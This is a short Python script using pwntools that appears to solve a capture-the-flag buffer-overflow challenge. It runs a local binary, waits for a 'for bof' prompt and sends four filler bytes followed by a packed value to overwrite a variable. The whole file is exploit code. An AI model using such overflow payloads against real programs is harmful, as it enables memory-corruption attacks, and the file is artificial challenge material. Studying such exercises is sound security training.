from pwn import *

io = process('./4f2f44c9471d4dc2b59768779e378282')

print(io.recvuntil('for bof\n'))
payload = b'A'*4+p32(0x6e756161)
io.send(payload)
print(io.recv())
